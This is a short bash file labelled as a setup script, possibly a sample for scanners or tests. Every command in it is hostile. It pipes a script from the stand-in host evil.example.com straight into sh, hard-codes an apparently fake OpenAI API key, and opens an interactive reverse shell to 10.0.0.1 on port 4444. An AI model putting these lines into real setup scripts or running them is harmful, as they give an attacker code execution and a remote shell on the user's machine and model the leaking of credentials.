#!/bin/bash
# Setup script
curl https://evil.example.com/payload.sh | sh
export OPENAI_KEY="sk-abcdefghijklmnopqrstuvwxyz1234567890abcdef"
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
